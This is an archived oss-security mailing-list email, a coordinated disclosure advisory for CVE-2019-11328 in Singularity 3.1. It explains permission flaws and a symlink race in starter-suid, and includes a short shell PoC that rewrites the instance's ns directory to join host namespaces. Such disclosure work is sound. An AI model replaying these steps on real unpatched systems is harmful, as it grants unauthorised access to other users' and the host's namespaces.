X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["7398" "Thursday" "16" "May" "2019" "12:15:58" "+0200" "Matthias Gerstner" "mgerstner@suse.de" nil "179" nil "^Date:" nil nil "5" nil nil (number mark "U       mgerstner@su May 16  179/7398  " thread-indent "\"[oss-security] Singularity 3.1.0: CVE-2019-11328: namespace privilege escalation and arbitrary file corruption\"\n") nil nil nil nil nil nil nil nil nil "[oss-security] Singularity 3.1.0: CVE-2019-11328: namespace privilege escalation and arbitrary file corruption" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 12274 invoked by uid 550); 16 May 2019 10:16:11 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Received: (qmail 12256 invoked from network); 16 May 2019 10:16:10 -0000
X-Virus-Scanned: by amavisd-new at test-mx.suse.de
Message-ID: <20190516101558.GB21014@f195.suse.de>
MIME-Version: 1.0
Content-Type: multipart/signed; micalg=pgp-sha256;
	protocol="application/pgp-signature"; boundary="IiVenqGWf+H9Y6IX"
Content-Disposition: inline
User-Agent: Mutt/1.10.1 (2018-07-13)
Date: Thu, 16 May 2019 12:15:58 +0200
From: Matthias Gerstner <mgerstner@suse.de>
Reply-To: oss-security@lists.openwall.com
Subject: [oss-security] Singularity 3.1.0: CVE-2019-11328: namespace privilege escalation
 and arbitrary file corruption
To: oss-security@lists.openwall.com

--IiVenqGWf+H9Y6IX
Content-Type: text/plain; charset=iso-8859-1
Content-Disposition: inline
Content-Transfer-Encoding: quoted-printable

Hello,

following is a report about a major security issue found in Singularity
[1] major version 3.1.

Introduction
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

Singularity is a Linux namespace based container solution often used in
HPC (high performance computing) environments. In the course of a code
review conducted for inclusion of the new Singularity major version 3 in
SUSE enterprise products I found a major security issue.

The issue affects Singularity versions >=3D 3.1.0 and it has recently been
fixed in an update to version 3.2.0 [2]. The issue was introduced via
upstream commit b4dcb0e4d77baa1c7647a4a5705ea824bb4e0dca [3].

Issue Details
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

Singularity 3 uses a setuid root program called `starter-suid` for
setting up Singularity containers. The issue is that containers run as
background instances get bad directory permissions in path
`/run/singularity/instances/sing/<user>/<instance>`. The permission of
these directories is set to "<user>:root" with mode 0550.  Since the
unprivileged user is the owner of the directory it may change the mode
to arbitrary values and therefore also the content of the directory to
arbitrary content.

A result of this is that symlinks can be placed in the `ns`
sub-directory that will be followed when joining the container instance
and thus allow unprivileged users to enter arbitrary mnt, pid, net,
cgroup, uts and ipc namespaces. Only user namespaces cannot be joined,
because the `starter-suid` binary refuses to use user namespaces when
running in the setuid context. (`starter-suid` also contains logic that
is only intended for use when the program doesn't carry a setuid root
bit).

Furthermore, because the `starter-suid` program trusts the content of
the JSON config file found in the instance directory, an attacker can
modify this content to change the behaviour of the `starter-suid`
program when joining a container. This way all desired namespaces can be
configured or even the `noNewPrivileges` field can be set to false,
allowing a user to join the container without the `PR_SET_NO_NEW_PRIVS`
bit set (see `prctl()`).

Even further, during creation of a background instance, the unprivileged
user can try to win a race condition and place a symlink in path
`/run/singularity/instances/sing/<user>/<instance>/<instance>.json`. The
`starter-suid` program will follow this symlink and create and truncate
an existing file in the target location. This allows to create or
overwrite arbitrary files in the system with root privileges. The
content written to the file is only partially attacker controlled,
because the beginning of the JSON has a fixed structure.

I couldn't work out a full local root exploit from these defects yet but
all of the findings are very close to getting root and if putting in
enough energy there's probably some way to achieve it. Being able to
enter arbitary other namespaces is similar in consequences as
CVE-2018-12021 was for Singularity major version 2.

The issue has been fixed by usptream by moving the instance
configuration file into the user's home directory, fixing the
permissions of the directory in /run and not trusting certain parameters
found in the instance's JSON configuration.

PoC
=3D=3D=3D

For completeness here is a couple of lines that show a PoC for joining
arbitrary ipc, pid and mnt namespaces based on Singularity release
3.1.1:

```
user $ singularity pull library://library/default/debian
[...]
user $ singularity instance start library://library/default/debian deb
# this is the normal way of entering the container, becoming a member of
# the regular container namespaces
user $ singularity shell instance://deb
  deb-user $ ls -l /proc/$$/ns
  lrwxrwxrwx 1 user users 0 Apr 15 15:41 cgroup -> cgroup:[4026531835]
  lrwxrwxrwx 1 user users 0 Apr 15 15:41 ipc -> ipc:[4026532284]
  lrwxrwxrwx 1 user users 0 Apr 15 15:41 mnt -> mnt:[4026532285]
  lrwxrwxrwx 1 user users 0 Apr 15 15:41 net -> net:[4026531992]
  lrwxrwxrwx 1 user users 0 Apr 15 15:41 pid -> pid:[4026532283]
  lrwxrwxrwx 1 user users 0 Apr 15 15:41 pid_for_children -> pid:[402653228=
3]
  lrwxrwxrwx 1 user users 0 Apr 15 15:41 user -> user:[4026531837]
  lrwxrwxrwx 1 user users 0 Apr 15 15:41 uts -> uts:[4026531838]
  deb-user $ exit

# now manipulate the state directory=20
user $ cd /run/singularity/instances/sing/$USER/deb
user $ ls -lhd .
dr-xr-x--- 3 user root 80 15. Apr 15:38 .
user $ chmod u+w .
user $ rmdir ns
user $ mkdir ns
user $ cd ns
user $ ln -s /proc/1/ns/pid
user $ ln -s /proc/1/ns/mnt
user $ ln -s /proc/1/ns/ipc
# oberserve the changed values for pid, mnt and ipc. Of course joining
# the root namespaces does not make much sense but it shows the
# principle of operation
user $ singularity shell instance://deb
  deb-user $ ls -l /proc/$$/ns
  lrwxrwxrwx 1 user users 0 15. Apr 15:43 cgroup -> 'cgroup:[4026531835]'
  lrwxrwxrwx 1 user users 0 15. Apr 15:43 ipc -> 'ipc:[4026531839]'
  lrwxrwxrwx 1 user users 0 15. Apr 15:43 mnt -> 'mnt:[4026531840]'
  lrwxrwxrwx 1 user users 0 15. Apr 15:43 net -> 'net:[4026531992]'
  lrwxrwxrwx 1 user users 0 15. Apr 15:43 pid -> 'pid:[4026531836]'
  lrwxrwxrwx 1 user users 0 15. Apr 15:43 pid_for_children -> 'pid:[4026531=
836]'
  lrwxrwxrwx 1 user users 0 15. Apr 15:43 user -> 'user:[4026531837]'
  lrwxrwxrwx 1 user users 0 15. Apr 15:43 uts -> 'uts:[4026531838]'
```

Timeline
=3D=3D=3D=3D=3D=3D=3D=3D

2019-04-15: I reported the finding to security@sylabs.io
2019-04-18: Sylabs confirmed the issue and discussed various patching
            approaches with me. The process described in [4] has been
            triggered.
2019-05-15: The agreed upon coordinated-release-date was reached and
            Sylabs published the fixed version.

References
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

[1]: https://www.sylabs.io
[2]: https://github.com/sylabs/singularity/releases/tag/v3.2.0
[3]: https://github.com/sylabs/singularity/commit/b4dcb0e4d77baa1c7647a4a57=
05ea824bb4e0dca
[4]: https://www.sylabs.io/singularity/security-policy

Regards

Matthias

--=20
Matthias Gerstner <matthias.gerstner@suse.de>
Dipl.-Wirtsch.-Inf. (FH), Security Engineer
https://www.suse.com/security
Phone: +49 911 740 53 290
GPG Key ID: 0x14C405C971923553

SUSE Linux GmbH
GF: Felix Imend=F6rffer, Mary Higgins, Sri Rasiah
HRB 21284 (AG Nuernberg)

--IiVenqGWf+H9Y6IX
Content-Type: application/pgp-signature; name="signature.asc"

-----BEGIN PGP SIGNATURE-----

iQIzBAABCAAdFiEE82oG1A8ab1eESZdjFMQFyXGSNVMFAlzdOFoACgkQFMQFyXGS
NVOxmQ/+K8v0Ouon2oLxq/hLo5Rdp0X23EYIXjRVPiqAR11h4zg3U3P+bhIvkPoh
jJS3hLPMFcjY4LJe2k5qzyI7M6L+/95Tfxuz1jXkg9p8qML6ZJ6LwpisSRKmw/4Y
b+6gp8+yHBeh2MtjLBfHb9FCKw3LAwibE487nNw01tyoxpsoHGljo88lqCsqaslY
Q7DrMEReT/7/lu5HTD6qQ96Iq82909YcTV37L5TMdRXmDdIA3w1UjSUa+/wz+DHP
AGVHOG7r4nbQUcQX+t302xVpeY3Gih41WBylAtGNL/uzl1YKN0lg8aa7UTUHSFY3
THj7vSmwsa+2ACj26S+MZuuJ3dFGGVcqh83//gk5eMrsg3STRVreLDTTuBX5tZb6
KhLsDvY+NrGv9D4Hq3XHvpVUuvS1fA9+PI64McyUoqPpJeyZ/REu08YsBwe+XXAw
j5hLg45jzX+LjaEy6wgU1RPHIRcDigrvbZ+9srnHSuvnuUyEabdpcxqQQUimb/i7
G92S9GRiN1elybsONeqcRrAKVTlUAm43Fl52UdjAGDDeUPHve60iBcAj9fO9OEWK
hZRaE0VU1yImrYPYJ0NylwDD7wCffwl69d6XY50+DFUfv01OMQEAM8ZPsVmZmTiH
5FXM+vUwBnPDRZ3MzctqnOxQu3w3Mw/ZL8MEKEiQuXj32o9ct/g=
=lLWT
-----END PGP SIGNATURE-----

--IiVenqGWf+H9Y6IX--
